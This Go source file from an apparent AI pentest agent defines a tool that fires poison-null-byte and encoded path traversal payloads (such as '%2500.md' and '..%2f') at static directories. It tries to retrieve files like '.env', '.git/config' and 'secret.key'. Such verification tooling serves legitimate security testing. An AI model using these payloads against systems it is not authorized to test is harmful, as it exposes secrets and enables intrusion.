package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	actool "artemis/engine/tool"
)

// Deterministic verifier for path traversal / poison-null-byte file access (Juice
// Shop V09/V10 family, OWASP A01/A05): a static file server that whitelists an
// extension can be tricked with a null byte (`secret.bak%2500.md`) or an encoded
// traversal (`..%2f`) into serving a file it should block. The weak model rarely
// crafts these and cannot tell a served secret from the SPA shell. This tool tries
// a generic battery and confirms only when a real NON-shell, non-listing file comes
// back, baselined against a known-nonexistent path.
//
// Honest limit: the filename battery is generic (package.json/.env/config/backup/
// .git), so this can FALSE-NEGATIVE on a target whose sensitive filenames differ;
// it does not false-positive (a hit is a real file body distinct from the shell).

var traversalDirs = []string{"/ftp", "/files", "/uploads", "/static", "/assets", "/public", "/download"}

var traversalFiles = []string{
	"package.json", "package.json.bak", ".env", "config.json",
	"database.sqlite", "backup.zip", ".git/config", "secret.key",
}

// traversalPayload builds the attack path for one (dir,file): the poison-null-byte
// extension bypass and the encoded upward traversal.
func traversalPayloads(dir, file string) []string {
	d := strings.TrimRight(dir, "/")
	return []string{
		d + "/" + file + "%2500.md",   // poison null byte + whitelisted ext (double-encoded)
		d + "/" + file + "%00.md",     // poison null byte (single-encoded)
		d + "/..%2f" + file,           // encoded traversal up one level
		d + "/..%252f" + file,         // double-encoded traversal
	}
}

// looksServedFile reports whether a body is a real served file (not the SPA shell,
// not a directory listing, not empty). fallback is the known-nonexistent baseline.
func looksServedFile(ctype, body, fallback string) bool {
	b := strings.TrimSpace(body)
	if b == "" || body == fallback {
		return false
	}
	if strings.Contains(b, "Index of") || strings.Contains(strings.ToLower(b), "parent directory") {
		return false // directory listing, handled by exposure_verify
	}
	// a non-HTML body, or an HTML body that still differs from the shell and looks
	// like structured/config content.
	if !strings.Contains(ctype, "text/html") {
		return true
	}
	lb := strings.ToLower(b)
	return strings.HasPrefix(b, "{") || strings.HasPrefix(b, "[") ||
		strings.Contains(lb, "\"dependencies\"") || strings.Contains(lb, "[core]") ||
		strings.Contains(lb, "password") || strings.Contains(lb, "secret")
}

func (t *ToolSet) traversalVerify() actool.CoreTool {
	schema := map[string]any{
		"type": "object",
		"properties": map[string]any{
			"url": map[string]any{
				"type":        "string",
				"description": "Base URL of the target, e.g. http://host:3000. The verifier tries null-byte and encoded-traversal payloads against common static directories; no path or payload needed.",
			},
		},
		"required": []any{"url"},
	}
	desc := "Deterministically CONFIRM or REFUTE path traversal / poison-null-byte file access. Against common static directories it tries null-byte extension bypasses (file%2500.md) and encoded traversals (..%2f), baselines the known-nonexistent response (the SPA shell), and confirms only when a real file body comes back that is neither the shell nor a directory listing. Use this instead of guessing from a 200. Pass the base URL."
	return readTool("traversal_verify", desc, schema, func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
		var a struct {
			URL string `json:"url"`
		}
		_ = json.Unmarshal(in, &a)
		raw := strings.TrimSpace(a.URL)
		if raw == "" {
			return actool.Errorf("url is required: pass the target base URL, e.g. http://host:3000"), nil
		}
		base, err := url.Parse(raw)
		if err != nil || base.Host == "" {
			return actool.Errorf("traversal_verify needs an absolute URL (scheme://host[:port]), got: " + clipXSS(raw, 120)), nil
		}
		root := base.Scheme + "://" + base.Host
		client := &http.Client{Timeout: 8 * time.Second, CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }}
		runCtx, cancel := context.WithTimeout(ctx, 45*time.Second)
		defer cancel()

		_, _, fallback, _ := fetchBody(runCtx, client, root+"/__artemis_nonexistent_"+fmt.Sprint(time.Now().UnixNano()))

		const maxRequests = 90
		requests := 0
		for _, dir := range traversalDirs {
			for _, file := range traversalFiles {
				for _, p := range traversalPayloads(dir, file) {
					if runCtx.Err() != nil || requests >= maxRequests {
						goto done
					}
					requests++
					status, ctype, body, ok := fetchBody(runCtx, client, root+p)
					if !ok || status < 200 || status >= 300 {
						continue
					}
					if looksServedFile(ctype, body, fallback) {
						return actool.Text(fmt.Sprintf(
							"CONFIRMED path traversal / null-byte file access at %s: the payload returned a real file body "+
								"(not the app shell, not a directory listing), so the static file server can be tricked into "+
								"serving blocked files. report_finding (path traversal / improper access control) with the GET "+
								"request and the file content as reproduction. Do NOT record this as a negative.", p)), nil
					}
				}
			}
		}
	done:
		return actool.Text(fmt.Sprintf(
			"No path traversal confirmed: tried %d null-byte/encoded-traversal payloads across common static directories on "+
				"%s; none returned a real blocked file (either 4xx, the SPA shell, or a directory listing). Note this battery "+
				"uses generic filenames, so a negative is not proof no traversal exists for other filenames. record_fact the "+
				"negative (inferred); do NOT report_finding.", requests, root)), nil
	})
}

// traversalSummaries / intent: fire on the base URL alone. Text contains "path
// traversal" so intentClass canonicalizes to "traversal".
func traversalSummaries(s Surface, _ int) []string {
	if strings.TrimSpace(s.Base) == "" {
		return nil
	}
	return []string{traversalIntentSummary(s.Base)}
}

func traversalIntentSummary(base string) string {
	return fmt.Sprintf(
		"Path traversal / null-byte file access check: call traversal_verify with the base URL %s to confirm or refute "+
			"serving blocked files via null-byte (file%%2500.md) or encoded traversal (..%%2f) against static directories. "+
			"If CONFIRMED, report_finding (path traversal) with the request and file content. If not, record_fact the "+
			"negative (inferred: the battery uses generic filenames) and do NOT report_finding.",
		base)
}
